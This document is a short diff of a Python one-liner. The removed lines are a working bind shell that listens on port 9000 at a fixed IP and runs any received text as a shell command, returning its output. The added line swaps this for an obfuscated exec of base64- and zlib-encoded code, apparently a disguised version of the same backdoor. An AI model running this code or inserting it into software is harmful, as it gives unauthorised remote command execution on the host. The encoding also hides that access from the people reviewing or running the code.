@@ -1,2 +1,1 @@
-python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("172.27.247.156",9000));s1.listen(1);c,a=s1.accept();
-while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
+exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNpNj09rAyEQxc/6KbxFiUhScgp4CGULobQNzd7Drk6JxK4y47Zfv5rsoXP7vffmX/jOCYug5G5QxECCeFikecyYHBA1GTklS+aRk2QOL5fje9drMueP59fLuf/sDm+qhswYJi/laqV3tdRdioEKTHLbQA/eo63i4BzkIhX/vYYIoscZ9pz5ZiG4H7ndPO0UZ+FLxNrrlbWb6rMRYbhxli2aU8rN0XSFGG0boKn4MDXreOoapLn8I0BcqA5ONptHou4bvFTrO9fMwpzVUwjqN0nxP4u+XnY=')[0])))
